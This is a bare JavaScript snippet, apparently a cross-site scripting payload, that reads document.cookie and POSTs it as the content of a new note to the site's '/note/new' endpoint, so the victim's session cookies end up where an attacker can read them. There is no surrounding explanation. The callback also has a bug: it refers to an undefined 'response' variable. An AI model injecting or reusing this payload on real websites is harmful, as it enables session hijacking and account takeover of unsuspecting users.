var formData = new FormData();
formData.append('title', 'test');
formData.append('content', document.cookie);
formData.append('submit', 'save');

fetch("/note/new", {
    method: "POST",
    body: formData
}).then(res => {
    alert(response.json);
});
